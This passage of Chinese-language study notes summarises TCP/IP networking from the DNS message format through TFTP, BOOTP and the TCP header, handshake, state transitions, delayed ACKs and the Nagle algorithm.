<li>16bit的标志字段被划分为若干子字段<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501145036.jpg" alt=""><br>   1）QR是1bit字段：0表示查询报文，1表示响应报文<br>   2）opcode是一个4bit字段：通常值为0（标准查询），其他值为1（反向查询）和2（服务器状态请求）<br>   3）AA是1bit标志，表示“授权回答”。该名字服务器是授权于该域的<br>   4）TC是1bit字段，表示“可截断的”。使用UDP时，它表示当应答的总长度超过512字节时，只返回前512个字节<br>   5）RD是1bit字段表示“期望递归”。该比特能在一个查询中设置，并在响应中返回。这个标志告诉名字服务必须处理这个查询，也称为一个递归查询。<br>   6）RA是1bit字段，表示“可用递归”。如果名字服务器支持递归查询，则在响应中该比特设置为1.<br>   7）随后的3bit字段必须为0<br>   8）recode是一个4bit的返回码字段。通常的值为0（没有差错）和3（名字差错）。名字差错只有从一个授权名字服务器上返回，它表示在查询中指定的域名不存在<br>   9）随后的4个16bit字段说明最后4个变长字段中包含的条目数。对于查询报文，问题数通常为1，而其他3项则均为0.</li>
</ul>
<h3><span id="dns查询报文中的问题部分">DNS查询报文中的问题部分</span></h3><p>问题部分中每个问题的格式如图14-5所示，通常只有一个问题<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501145102.jpg" alt=""></p>
<ul>
<li>查询名是要查找的名字，它是一个或多个标识符的序列。每个标识符以首字节的计数值来说明随后标识符的字节长度，每个名字以最后字节为0结束，长度为0的标识符是根标识符。计数字节的值必须是0-63的数，因为标识符最大长度仅为63.</li>
<li>每个问题有一个查询类型，而每个响应（也称一个资源记录）也有一个类型。</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501145125.jpg" alt=""></p>
<ul>
<li>最常用的查询类型是A类型，表示期望获得查询名的IP地址。一个PTR查询则请求获得一个IP地址对应的域名</li>
<li>查询类通常是1，指互联网地址</li>
</ul>
<h3><span id="dns响应报文中的资源记录部分">DNS响应报文中的资源记录部分</span></h3><p>DNS报文中最后的是三个字节，回答字段、授权字段和附加信息字段，均采用一种称为资源记录RR的相同格式。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501145150.jpg" alt=""></p>
<ul>
<li>域名是记录中资源数据对应的名字</li>
<li>类型说明RR的类型码。它的值和查询类型值是一样的，类通常为1，值Internet数据</li>
<li>生成时间字段是客户程序保留该资源记录的秒数，通常的生成时间自为2天</li>
<li>资源数据长度说明资源的数量</li>
</ul>
<h2><span id="指针查询">指针查询</span></h2><ul>
<li>即给定一个IP地址，返回与该地址对应的域名</li>
<li>查询结果包含一个回答RR，且为授权回答比特置1.RR的类型是PTR，资源数据中包含该域名</li>
</ul>
<h2><span id="主机名检查">主机名检查</span></h2><p>当一个IP数据报到达一个作为服务器的主机时，无论是UDP数据报还是TCP连接请求，服务器进程所能获得的是客户的IP地址和端口号（UDP和TCP）。</p>
<h2><span id="资源记录">资源记录</span></h2><p>资源记录（RR）：IP地址查询为A类型，指针查询为类型FTR。由名字服务器返回的资源记录：回答RR、授权RR和附加信息RR。现有大约20种不同类型的资源记录。</p>
<ul>
<li>A：一个A记录定义了一个IP地址，它存储32bit的二进制数</li>
<li>PTR：指针记录用于指针查询</li>
<li>CNAME：这表示“规范名字（canonical name）”。它用来表示一个域名，而有规范名字的域名通常被称为别名</li>
<li>HINFO:表示主机信息：包括说明主机CPU和操作系统的两个字符串。并非所有的站点均提供它们系统的HINFO记录，并且提供的信息也可能不是最新的</li>
<li>MX:邮件交换记录</li>
<li>NS:名字服务器记录</li>
</ul>
<h2><span id="高速缓存">高速缓存</span></h2><ul>
<li>为了减少Internet上DNS的通信量，所有的名字服务器均使用高速缓存。</li>
<li>在标准的Unix实现中，高速缓存是由名字服务器而不是由名字解析器维护的。</li>
</ul>
<h1><span id="tftp简单文件传送协议">TFTP：简单文件传送协议</span></h1><h2><span id="引言">引言</span></h2><ul>
<li>TFTP（Trivial File Transfer Protocol）即简单文件传送协议，最初打算用于引导无盘系统</li>
<li>TFTP使用UDP</li>
<li>TFTP的代码（和它需要的UDP、IP和设备驱动程序）都能适合只读存储器</li>
</ul>
<h2><span id="协议">协议</span></h2><ul>
<li>在开始工作时，T F T P的客户与服务器交换信息，客户发送一个读请求或写请求给服务器。在一个无盘系统进行系统引导的正常情况下，第一个请求是读请求（ R R Q）。</li>
<li>T F T P报文的头两个字节表示操作码。对于读请求和写请求（ W R Q），文件名字段说明客户要读或写的位于服务器上的文件。这个文件字段以 0字节作为结束（见图 1 5 - 1）。模式字段是一个A S C I I码串n e t a s c i i或o c t e t（可大小写任意组合），同样以0字节结束。n e t a s c i i表示数据是以成行的A S C I I码字符组成，以两个字节 — 回车字符后跟换行字符（称为C R / L F）作为行结束符。</li>
<li>每个数据分组包含一个块编号字段，它以后要在确认分组中使用。</li>
<li>在写请求的情况下，TFTP 客户发送W R Q指明文件名和模式。如果该文件能被 该客户写，TFTP 服务器就返回块编号为 0的A C K包。该客户就将文件的头 5 1 2字节以块编号为1发出。服务器则返回块编号为1的A C K。这种类型的数据传输称为停止等待协议。</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501150021.jpg" alt=""></p>
<ul>
<li>最后一种T F T P报文类型是差错报文，它的操作码为 5。它用于服务器不能处理读请求或写请求的情况。在文件传输过程中的读和写差错也会导致传送这种报文，接着停止传输。差错编号字段给出一个数字的差错码，跟着是一个 A S C I I表示的差错报文字段，可能包含额外的操作系统说明的信息。</li>
<li>既然T F T P使用不可靠的U D P，T F T P就必须处理分组丢失和分组重复。分组丢失可通过发送方的超时与重传机制解决（注意存在一种称为“魔术新手综合症 ( s o r c e r e r’s apprentices y n d r o m e )”的潜在问题，如果双方都超时与重传，就可能出现这个问题。</li>
</ul>
<h2><span id="安全性">安全性</span></h2><ul>
<li>在T F T P分组（图1 5 - 1）中并不提供用户名和口令。这是 T F T P的一个特征（即“安全漏洞”）。由于T F T P是设计用于系统引导进程，它不可能提供用户名和口令。</li>
<li>目前大多数 T F T P服务器提供了一个选项来限制只能访问特定目录下的文件（U n i x系统中通常是/ t f t p b o o t）。这个目录中只包含无盘系统进行系统引导时所需的文件</li>
</ul>
<h1><span id="bootp引导程序协议">BOOTP：引导程序协议</span></h1><h2><span id="引言">引言</span></h2><ul>
<li>无盘系统在不知道自身IP地址的情况下，在进行系统引导时能够通过RARP来获取它的IP地址。然而使用RARP有两个问题：（1）I P地址是返回的唯一结果；（2）既然R A R P使用链路层广播， R A R P请求就不会被路由器转发（迫使每个实际网络设置一个RARP 服务器）</li>
<li>BOOTP（引导程序协议）是一种用于无盘系统进行系统引导的替代方法</li>
<li>BOOTP使用UDP，且通常需与TFTP协同工作</li>
</ul>
<h2><span id="bootp的分组格式">BOOTP的分组格式</span></h2><p>BOOTP 请求和应答均被封装在U D P数据报中，如图1 6 - 1所示。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501151809.jpg" alt=""></p>
<p>图1 6 - 2显示了长度为3 0 0字节的B O O T P请求和应答的格式。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501151910.jpg" alt=""></p>
<ul>
<li>“操作码”字段为1表示请求，为2表示应答。硬件类型字段为 1表示10 Mb/s的以太网</li>
<li>“跳数”字段由客户设置为0，但也能被一个代理服务器设置</li>
<li>“事务标识”字段是一个由客户设置并由服务器返回的 32 bit整数。客户用它对请求和应答进行匹配。对每个请求，客户应该将该字段设置为一个随机数。    </li>
<li>客户开始进行引导时，将“秒数”字段设置为一个时间值。服务器能够看到这个时间值，备用服务器在等待时间超过这个时间值后才会响应客户的请求，这意味着主服务器没有启动。</li>
<li>如果该客户已经知道自身的 I P地址，它将写入“客户 I P地址”字段。否则，它将该字段设置为0。对于后面这种情况，服务器用该客户的 I P地址写入“你的 I P地址”字段。“服务器I P地址”字段则由服务器填写。如果使用了某个代理服务器（见 1 6 . 5节），则该代理服务器就填写“网关I P地址”字段。</li>
<li>客户必须设置它的“客户硬件地址”字段。尽管这个值与以太网数据帧头中的值相同，U D P数据报中也设置这个字段，但任何接收这个数据报的用户进程能很容易地获得它（例如一个BOOTP 服务器）。一个进程通过查看U D P数据报来确定以太网帧首部中的该字段通常是很困难的（或者说是不可能的）。</li>
<li>“服务器主机名”字段是一个空值终止串，由服务器填写。服务器还将在“引导文件名字段”填入包括用于系统引导的文件名及其所在位置的路径全名。</li>
<li>“特定厂商区域”字段用于对B O O T P进行不同的扩展。</li>
</ul>
<h3><span id="端口号">端口号</span></h3><p>B O O T P有两个熟知端口：BOOTP 服务器为6 7，BOOTP 客户为6 8。</p>
<h1><span id="tcp传输控制协议">TCP：传输控制协议</span></h1><h2><span id="tcp的服务">TCP的服务</span></h2><ul>
<li>TCP提供一种面向连接的、可靠的字节流服务</li>
<li>面向连接意味着两个使用TCP的应用（通常是一个客户和一个服务器）在彼此交换数据之间必须先建立一个TCP连接</li>
<li>在一个TCP连接中，仅有两方进行彼此通信</li>
</ul>
<h3><span id="tcp通过下列方式来提供可靠性">TCP通过下列方式来提供可靠性</span></h3><ul>
<li>应用数据被分隔成TCP认为最适合发送的数据块</li>
<li>当TCP发出一个段后，它启动一个定时器，等待目的端确认收到这个报文段。如果不能及时收到一个确认，将重发这个报文段</li>
<li>当TCP收到发自TCP连接另一端的数据，它将发送一个确认。这个确认不是立即发送，通常将推迟几分之一秒</li>
<li>TCP将保持它首部和数据的检验和</li>
<li>既然TCP报文段作为IP数据报来传输，而IP数据报的到达可能会失序，因此TCP报文段的到达可能会失序。如果必要，TCP将对收到的数据进行重新排序，将收到的数据以正确的顺序交给应用层</li>
<li>既然IP数据报会发生重复，TCP的接收端必须丢弃重复的数据</li>
<li>TCP还能提供流量控制。TCP连接的每一方都有固定大小的缓冲空间。TCP的接收端只允许另一端发送接收端缓冲区所能接纳的数据。这将防止较快主机致使较慢主机的缓冲区溢出</li>
</ul>
<h3><span id="tcp的字节流">TCP的字节流</span></h3><ul>
<li>两个应用程序通过TCP连接交换8 bit构成的字节流。TCP不在字节流中插入记录标识符。将这称为字节流服务。</li>
<li>假设一方的应用程序先传10字节，又传20字节，再传50字节，连接的另一方将无法了解发方每次发送了多少字节。收方可以分4次接收这80个字节，每次接收20字节。</li>
<li>TCP对字节流的内容不作任何解释，它不知道传输的数据字节流是二进制数据、ASCII字符、EBCDIC字符或其他类型数据。由TCP双方的应用层对字节流进行解释。</li>
</ul>
<h2><span id="tcp的首部">TCP的首部</span></h2><p>TCP数据被封装在一个IP数据报中<br><img src="http://images.cnitblog.com/blog2015/697266/201504/221940145468929.png" alt=""></p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/221941291718831.png" alt=""></p>
<ul>
<li>每个TCP段都包含源端和目的端的端口号，用于寻找发端和收端应用进程。这两个值加上IP首部中的源端IP地址和目的端IP地址唯一确定一个TCP连接</li>
<li>一个IP地址和一个端口号也称为一个插口（socket）。插口对（socket pair）（包含客户IP地址、客户端口号、服务器IP地址和服务器端口号的四元组）可唯一确定互联网网络中每一个TCP连接的双方</li>
<li>序号用来标识从TCP发端向收端发送的数据字节流。如果将字节流看作是在两个应用程序间的单向流动，则TCP用序号对每个字节进行计数。序号是32 bit的无符号数，到达2^32-1后又从0开始。SYN标志消耗了一个序号</li>
<li>因为每个传输的字节都被计数，确认序号包含发送确认的一端所期望收到的下一个序号，即确认序号是上次已成功收到数据字节序号加1。只有ACK标志为1时确认序号字段才有效</li>
<li>发送ACK无需占用任何序号，因为32 bit的确认序号字段和ACK标志一样，总是TCP首部的一部分。因此，一旦一个连接建立起来，这个字段总是被设置，ACK标志也总是被设置为1。</li>
<li>首部长度给出首部中32 bit字的数目。需要这个值是因为任选字段的长度是可变的。这个字段占4 bit，因此TCP最多有60字节的首部（32bit*(2^4-1)）。如果没有选项字段，正常的长度是20字节。</li>
<li>TCP为应用层提供全双工服务。这意味数据能在两个方向上独立地进行传输。因此，连接的每一端必须保持每个方向上的传输数据序号</li>
<li>TCP的流量控制由连接的每一端通过声明的窗口大小来提供。窗口大小为字节数，起始于确认序号字段指明的值，这个值是接收端期望接收的字节。窗口大小是一个16 bit字段，因而窗口大小最大为65535字节。</li>
<li>检验和覆盖了整个TCP报文段包括TCP首部和TCP数据。这是一个强制性的字段，一定是由发端计算和存储，并由收端进行验证。<br>说明：TCP检验和的计算与UDP检验和的计算相似，使用一个伪首部。</li>
<li>只有当URG标志置1时紧急指针才有效。紧急指针是一个正的偏移量，和序号字段中的值相加表示紧急数据最后一个字节的序号。TCP的紧急方式是发送端向另一端发送紧急数据的一种方式。</li>
<li>最常见的选项字段是最长报文大小，又称为MSS (Maximum Segment Size)。每个连接方通常都在通信的第一个报文段（为建立连接而设置SYN标志的那个段）中指明这个选项。它指明本端所能接收的最大长度的报文段。</li>
<li>TCP报文段中的数据部分是可选的。例如：一个连接建立和终止时，双方交换的报文段仅有TCP首部。在处理超时的许多情况中，也会发送不带任何数据的报文段。</li>
</ul>
<h3><span id="tcp首部中有6个标志比特">TCP首部中有6个标志比特</span></h3><p>可同时多个被设置为1</p>
<ul>
<li>URG        紧急指针有效</li>
<li>ACK        确认序号有效</li>
<li>PSH        接收方应该尽快将这个报文段交给应用层</li>
<li>PST        重建连接</li>
<li>SYN        同步序号用来发起一个连接。</li>
<li>FIN        发端完成发送任务</li>
</ul>
<h1><span id="tcp连接的建立与终止">TCP连接的建立与终止</span></h1><h2><span id="引言">引言</span></h2><ul>
<li>TCP是一个面向连接的协议。无论哪一方向另一方发送数据之前，都必须先在双方之间<br>建立一条连接。本章将详细讨论一个 T C P连接是如何建立的以及通信结束后是如何终止的。</li>
<li>这种两端间连接的建立与无连接协议如 U D P不同。我们在第 11章看到一端使用U D P向另<br>一端发送数据报时，无需任何预先的握手。</li>
</ul>
<h2><span id="建立连接协议">建立连接协议</span></h2><h3><span id="建立连接协议">建立连接协议</span></h3><p>如18-3所示，为了建立一条TCP连接：<br><img src="http://images.cnitblog.com/blog2015/697266/201504/222117276092162.png" alt=""></p>
<ul>
<li>请求端（客户）发送一个SYN段指明客户打算连接的服务器的端口，以及初始序号（ISN，例子中为1415531521），如报文1。</li>
<li>服务器发回包含服务器的初始序号的SYN报文段（报文段2）作为应答。同时，将确认序号设置为客户的ISN加1以对客户的SYN报文段进行确认。一个SYN将占用一个序号。</li>
<li>客户必须将确认序号设置为服务器的ISN加1以对服务器的SYN报文段进行确认（报文段3）。</li>
</ul>
<p>这三个报文段完成连接的建立，这个过程也称为三次握手。</p>
<p>说明：</p>
<ul>
<li><p>发送第一个SYN的一端将执行主动打开，接收这个SYN并发回下一个SYN的另一端执行被动打开。</p>
</li>
<li><p>当一端为建立连接而发送它的SYN时，它为连接选择一个初始序号。ISN随时间而变化，因此每个连接都将具有不同的ISN。</p>
</li>
</ul>
<h3><span id="终止连接">终止连接</span></h3><p>终止一个连接要经过4次握手。这是由TCP的半关闭造成的。<br>说明：</p>
<ul>
<li>因为TCP是全双工的（数据在两个方向上能同时传递），因此每个方向必须单独进行关闭。原则是：当一方完成它的数据发送任务后发送一个FIN来终止这个方向连接。当一端收到一个FIN时，它必须通知应用层另一端已经终止了那个方向的数据传送。</li>
</ul>
<p>注意：发送FIN通常是应用层进行关闭的结果。</p>
<ul>
<li>收到一个FIN只意味着在这一方向上没有数据流动。</li>
</ul>
<p>注意：一个TCP连接在收到一个FIN后仍能发送数据，这对利用半关闭的应用来说是可能的，尽管在实际应用中只有很少的TCP应用程序这样做。</p>
<p>图18-4显示了终止一个连接的典型握手顺序。<br><img src="http://images.cnitblog.com/blog2015/697266/201504/222146082184141.png" alt=""><br>发送FIN将导致应用程序关闭它们的连接，这些FIN的ACK是由TCP软件自动产生的。</p>
<h2><span id="最大报文段长度">最大报文段长度</span></h2><ul>
<li>最大报文段长度（MSS）表示TCP传往另一端的最大块数据的长度。当一个连接建立时，连接的双方都要通告各自的MSS。</li>
<li>当建立一个连接时，每一方都有用于通告它期望接收的MSS选项（MSS选项只能出现在SYN报文段中）。如果一方不接收来自另一-*    方的MSS值，则MSS就定为默认值536字节（这个默认值允许20字节的IP首部和20字节的TCP首部以适合576字节IP数据报。</li>
</ul>
<p>注意：</p>
<p>（1）一般说来，如果没有分段发生，MSS越大越好。报文段越大允许每个报文段传送的数据就越多，相对IP和TCP首部有更高的网络利用率。</p>
<p>（2）当TCP发送一个SYN时，或者是因为一个本地应用进程想发起一个连接，或者是因为另一端的主机收到了一个连接请求，它能将MSS值设置为外出接口上的MTU长度减去固定的IP首部和TCP首部长度。</p>
<p>（3）如果目的IP地址为“非本地的(non-local)”，MSS通常的默认值为536。</p>
<p>说明：区分地址是本地还是非本地的方法是：如果目的IP地址的网络号与子网号都与本机相同，则是本地的；如果目的IP地址的网络号与本机相同而子网号不同，则可能是本地的，也可能是非本地的。</p>
<p>（4）MSS使得主机限制另一端发送数据报的长度。加上主机也能控制它发送数据报的长度，这使得以较小MTU连接到一个网络上的主机避免分段。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/241932528289870.png" alt=""><br>主机sun向slip发起一个TCP连接，利用tcpdump命令来观察报文段：<br><img src="http://images.cnitblog.com/blog2015/697266/201504/241934592035362.png" alt=""></p>
<p>说明：</p>
<p>（1）sun发送的报文段不能超过256字节的数据，因为slip已经告知它的MSS值为256。（上图第二个红框）</p>
<p>（2）slip知道它外出接口的MTU长度为296，所以即使sun已经告诉它的MSS为1460（上图第一个红框），但为避免将数据分段，它不会发送超过256字节数据的报文段。</p>
<p>（<br>3）如果两端主机都连接到以太网上，都采用536的MSS，但中间网络采用296的MTU，同样会出现分段。</p>
<h2><span id="tcp的半关闭">TCP的半关闭</span></h2><p>TCP提供了连接的一端在结束它的发送后还能接收来自另一端数据的能力，即半关闭。</p>
<p>注意：很少有应用程序使用它，如果想要使用这个功能，需要编程接口提供一个方式来说明。</p>
<p>下面给出一个例子：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/241948297963788.png" alt=""></p>
<p>意思是这样的：客户结束了发送数据（发送了FIN），服务器发送ACK表示确认后，仍然可以发送数据给客户（图中红框）。</p>
<h2><span id="tcp的状态变迁图">TCP的状态变迁图</span></h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/241955122346274.png" alt=""></p>
<h3><span id="2msl等待状态">2MSL等待状态</span></h3><p>TIME_WAIT状态也称为2MSL等待状态。每个具体TCP实现必须选择一个报文段最大生存时间MSL（Maximum Segment Lifetime）。它是任何报文段被丢弃前在网络内的最长时间。</p>
<p>注意：MSL是个有限的时间，我们知道TCP报文段以IP数据报在网络中传输，IP数据报是由TTL字段限制其生存时间的。RFC 793指出MSL为2分钟。实现中的常用值是30秒，1分钟，或2分钟。</p>
<p>对于给定的MSL值，原则是：当TCP执行一个主动关闭，并发回最后一个ACK，该连接必须在TIME_WAIT状态停留的时间为2倍的MSL。这样可让TCP再次发送最后的ACK以防这个ACK丢失（另一端超时并重发最后的FIN）。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/242008047654027.png" alt=""></p>
<p>说明：</p>
<p>1）客户执行主动关闭并进入TIME_WAIT是正常的。服务器通常执行被动关闭，不会进入TIME_WAIT状态。</p>
<p>2）TCP连接在2MSL等待期间，这个连接的socket（客户的IP地址和端口号，服务器的IP地址和端口号）不能再被使用。这个连接只能在2MSL结束后才能再被使用。</p>
<h3><span id="平静时间的概念">平静时间的概念</span></h3><p>如果处于2MSL等待端口的主机出现故障，它会在MSL秒内重新启动，并立即使用故障前处于2MSL的socket来建立一个新的连接。在故障前从这个连接发出而迟到的报文段会被错误地当作属于重启后新连接的报文段。</p>
<p>为了防止这种情况，RFC 793指出TCP在重启动后的MSL秒内不能建立任何连接，称为平静时间(quiet time)。</p>
<h3><span id="fin_wait_2状态">FIN_WAIT_2状态</span></h3><p>如上面的图所示：FIN_WAIT_2状态时，客户已经发出了FIN，另一端也已对它进行确认。</p>
<p>除非客户设置了半关闭，否则将等待另一端的应用层意识到它已收到一个文件结束符说明，并向我们发一个FIN 来关闭连接。只有这样，我们这端才会从FIN_WAIT_2状态进入TIME_WAIT状态。</p>
<h2><span id="复位报文段">复位报文段</span></h2><p>TCP首部中的RST比特是用于“复位”的，一般无论何时一个报文段发往“基准连接”出现错误，TCP都会发出一个复位报文段。</p>
<p>说明：“基准连接”是指由目的IP地址和端口号以及源IP地址和端口号指明的连接。</p>
<h3><span id="到不存在的端口的连接请求">到不存在的端口的连接请求</span></h3><p>产生复位的一种常见情况是当连接请求到达时，目的端口没有进程正在听。</p>
<p>注意：对于UDP，当一个数据报到达目的端口时，该端口没在使用，它将产生一个ICMP端口不可达的信息；对于TCP，则使用复位。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/242052314061888.png" alt=""></p>
<p>图中的意思是说：主机bsdi向svr4的20000端口发送SYN，然后svr4告诉bsdi一个复位连接的信息。</p>
<h3><span id="异常终止一个连接">异常终止一个连接</span></h3><p>终止一个连接的正常方式是一方发送FIN。这也称为有序释放，因为在所有排队数据都已发送之后才发送FIN，正常情况下没有任何数据丢失。但也有可能发送一个复位报文段而不是FIN来中途释放一个连接。这也称为为异常释放。</p>
<p>异常终止一个连接对应用程序来说有两个优点：</p>
<p>1）丢弃任何待发数据并立即发送复位报文段；</p>
<p>2）RST的接收方会区分另一端执行的是异常关闭还是正常关闭。</p>
<p>特别注意：RST报文段不会导致另一端产生任何响应，另一端根本不进行确认。收到RST的一方将终止该连接，并通知应用层连接复位。</p>
<h3><span id="检测半打开连接">检测半打开连接</span></h3><p>如果一方已经关闭或异常终止连接而另一方却还不知道，将这样的TCP连接称为半打开的。</p>
<p>说明：</p>
<p>1）任何一端的主机异常都可能导致半打开连接。只要不在半打开连接上传输数据，仍处于连接状态的一方就不会检测到另一方已经出现异常。</p>
<p>2）半打开连接的另一个常见原因是当客户主机突然掉电而不是正常的结束客户应用程序后再关机。</p>
<h2><span id="同时打开">同时打开</span></h2><p>两个应用程序同时彼此执行主动打开的情况是可能的，尽管发生的可能性极小。每一方必须发送一个SYN，且这些SYN必须传递给对方。这需要每一方使用一个对方熟知的端口作为本地端口，称为同时打开。</p>
<p>TCP对于同时打开仅建立一条连接而不是两条连接。当出现同时打开时：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/242113260463855.png" alt=""></p>
<p>两端几乎同时发送SYN，并进入SYN_SENT状态。当每一端收到SYN时，状态变为SYN_RCVD，同时它们都再发SYN并对收到的SYN进行确认。当双方都收到SYN及相应的ACK时，状态都变迁为ESTABLISHED。</p>
<p>注意：</p>
<p>（1）一个同时打开的连接需要交换4个报文段，比正常的三次握手多一个。</p>
<p>（2）对于同时打开的连接，我们没有将任何一端称为客户或服务器，因为每一端既是客户又是服务器。</p>
<h2><span id="同时关闭">同时关闭</span></h2><p>双方都执行主动关闭也是可能的，TCP也允许同时关闭。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/242119433438389.png" alt=""></p>
<p>同时关闭过程为：</p>
<p>（1）当应用层发出关闭命令时，两端均从ESTABLISHED变为FIN_WAIT_1。这将导致双方各发送一个FIN，两个FIN经过网络传送后分别到达另一端。</p>
<p>（2）收到FIN后，状态由FIN_WAIT_1变为CLOSING，并发送最后的ACK。</p>
<p>（3）当收到最后的ACK时，状态变化为TIME_WAIT。</p>
<p>注意：同时关闭和正常关闭报文段交换数目相同。</p>
<h2><span id="tcp选项">TCP选项</span></h2><p>TCP首部可以包含选项部分。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/242127116875983.png" alt=""></p>
<p>选项说明：</p>
<p>（1）每个选项的开始是1字节kind字段，说明选项的类型。</p>
<p>（2）kind字段为0和1的选项仅占1个字节。其他选项在kind字节后还有len字节，它说明的长度是指总长度，包括kind字节和len字节。</p>
<p>（3）设置无操作选项的原因在于允许发方填充字段为4字节的倍数。</p>
<h1><span id="tcp的交互数据流">TCP的交互数据流</span></h1><h2><span id="引言">引言</span></h2><p>有关TCP通信量的研究发现：按分组数量计算，约有一半的TCP报文段包含成块数据（如FTP、电子邮件和Usenet新闻），另一半则包含交互数据（如Telnet和Rlogin）。按字节计算，成块数据与交互数据的比例约为90%和10%。</p>
<p>成块数据的报文段基本上都是满长度的（通常为512字节的用户数据），交互数据则小得多（Telnet和Rlogin分组中约90%左右的用户数据小于10个字节）</p>
<p>TCP需要同时处理这两类数据，但使用的处理算法不同。</p>
<h2><span id="交互式输入">交互式输入</span></h2><p>说明：本书是以远程登录Rlogin协议模拟交互输入的，我没有进行相关实验，下面我会给出作者所做的实验截图。</p>
<p>如图19-1所示，Rlogin协议需要远程系统回显客户输入的字符，每按一个字符就会产生一个分组，而不是每次一行作为一个分组。</p>
<p>一般可以将报文段2和3合并（图中两个红框）</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/271740550057766.png" alt=""></p>
<p>当我们键入5个字符date\n时的数据流，如图19-2所示：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/271750297082325.png" alt=""></p>
<p>说明：</p>
<p>（1）第1行：客户发送字符d到服务器；第2行：该字符的确认及回显；第3行：回显字符的确认。</p>
<p>（2）与字符a有关的是第4~6行，与字符t有关的是第7~9行，与字符e有关的是第10~12行。</p>
<p>（3）13~15行与上面稍有不同。客户发送到服务器的是一个字符（换行符），而回显的是两个字符（图中14行红线处），这两个字符为：回车和换行字符，作用是将光标移动到左边并换到下一行。</p>
<p>（4）第16行：来自服务器date命令的输出。这30个字节（图中红线处）由28个字符与最后的回车+换行组成。第17、18行：服务器发往客户7个字符（第18行），它们是在服务器主机上的客户提示符：svr4%。第19行：确认了这7个字符。</p>
<h2><span id="经受时延的确认">经受时延的确认</span></h2><p>图19-3表示了图19-2中数据交换的时间。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/271808466309708.png" alt=""></p>
<p>通常TCP在接收到数据时并不立即发送ACK；它会推迟发送，以便将ACK与需要沿该方向发送的数据一起发送，有时称这种现象为数据捎带ACK。</p>
<p>说明：绝大多数实现采用的时延为200ms，即TCP将以最大200ms的时延等待是否有数据一起发送。</p>
<p>下面我假设你会看这张图中标记的时间差，会计算实际时间（累加）。说明如下：</p>
<p>观察bsdi接收到数据和发送ACK之间的时间差：123.5、65.6、109.0、132.2、42.0、140.3和195.8 ms，似乎是随机的。观察bsdi发送ACK的实际时间（从0开始计算）为：139.9、539.3、940.1、1339.9、1739.9、1940.1和2140.1 ms，这些时间差是200ms的整数倍。</p>
<p>注意：因为TCP使用了一个200ms的定时器，以相对于内核引导的200ms固定时间溢出。由于将要确认的数据是随机到达的，TCP在内核的200ms定时器的下一次溢出时得到通知。</p>
<h2><span id="nagle算法">Nagle算法</span></h2><p>Rlogin连接时，一般每次发送一个字节到服务器，这就产生了一些41字节长的分组：20字节的IP首部、20字节的TCP首部和1个字节的数据。</p>
<p>在局域网上，这些小分组（被称为微小分组tinygram）通常不会引起麻烦，因为局域网一般不会出现拥塞。在广域网上，这些小分组则会增加拥塞出现的可能。一种简单有效的方法就是采用RFC 896建议的Nagle算法。</p>
<p>算法说明：</p>
<p>算法要求一个TCP连接上最多只能有一个未被确认的未完成的小分组，在该分组的确认到达之前不能发送其他的小分组。相反，TCP收集这些少量的分组，并在确认到来时以一个分组的方式发出去。</p>
<p>算法优点：</p>
<p>算法的优越之处在于它是自适应的：确认到达得越快，数据也就发送得越快。在希望减少微小分组数目的低速广域网上，则会发送更少的分组。</p>
<p>从图19-3中看到，在以太网上一个字节被发送、确认和回显的平均往返时间约为16ms。为了产生比这个速度更快的数据，我们每秒键入的字符必须多于60个。说明在局域网环境下两个主机之间发送数据时很少使用这个算法。</p>
<p>当往返时间（RTT）增加时，如通过一个广域网，情况发生了变化。如图19-4：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/271843132408414.png" alt=""></p>
<p>从左到右待发数据的长度是不同的，分别为：1、1、2、1、2、2、3、1和3个字节。这是因为客户只有收到前一个数据的确认后才发送已经收集的数据。通过使用Nagle算法，为发送16个字节的数据客户只需要使用9个报文段，而不再是16个。</p>
<p>关闭Nagle算法</p>
<p>有时我们也需要关闭Nagle算法。例如，X窗口系统服务器，小消息（鼠标移动）必须无时延地发送，以便为进行某种操作的交互用户提供实时的反馈。</p>
<h2><span id="窗口大小通告">窗口大小通告</span></h2><p>观察图19-4，可以看到slip通告窗口大小为4096字节，vangogh通告其窗口大小为8192字节。但报文段5通告的窗口大小为4095个字节，意味着TCP缓冲区中仍然有一个字节等待应用程序（Rlogin客户）读取。</p>
<p>说明：</p>
<p>（1）通常服务器通告窗口大小为8192个字节，这是因为服务器在读取并回显接收到的数据之前，其TCP没有数据发送。当服务器已经读取了来自客户的输入后，来自服务器的数据将被发送。</p>
<p>（2）在ACK到来时，客户的TCP总是有数据需要发送。这是因为它在等待ACK的过程中缓存接收到的字符。当客户TCP发送缓存的数据时，Rlogin客户没有机会读取来自服务器的数据，因此，客户通告的窗口大小总是小于4096。</p>
<h1><span id="tcp的成块数据流">TCP的成块数据流</span></h1><h2><span id="正常数据流">正常数据流</span></h2><ul>
<li>通常使用的“隔一个报文段确认”的策略</li>
<li>分组顺序依赖于许多无法控制的因素：发送方T C P的实现、接收方T C P的实现、接收进程读取数据（依赖于操作系统的调度）和网络的动态性（如以太网的冲突和退避等）。</li>
</ul>
